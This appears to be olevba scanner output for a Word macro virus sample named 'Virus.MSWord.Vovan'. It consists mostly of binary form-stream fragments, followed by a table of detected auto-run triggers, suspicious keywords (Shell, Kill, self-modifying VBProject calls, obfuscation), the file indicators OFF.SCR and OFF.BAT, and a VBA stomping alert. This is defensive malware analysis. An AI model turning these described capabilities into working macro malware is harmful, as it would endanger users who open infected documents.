- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����.�t=P̨�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f$q�VJ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S2n���&j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������-8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����m1�m(*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S{�BH"A��J�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��l�G��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q�`���*K*��Nؽ���4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9D�s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y�É���R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;/R�k�R��(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y��!�||[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N�^�<7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����M�sAr�2�d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��y�s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U��Rd��܍�#�nb�
E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h��v[��j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F=�6����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��6ѭw
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*�*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(씹���}Ò��~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J��9�r����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z(yA�HySl������w4{��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��5�@��2�A�y����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�:9�Q%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��l���؂/yg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�RԺc�Slh�'?,5Z(���F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����%Ƹp0Noܙǀo��b��7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ޥW�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@���qA�S�i����0��2x����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3-C~�!��4F	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����J�`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,w���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Vovan' - OLE stream: 'Macros/picture'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Image1_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |OFF.SCR             |Executable file name                         |
|IOC       |OFF.BAT             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

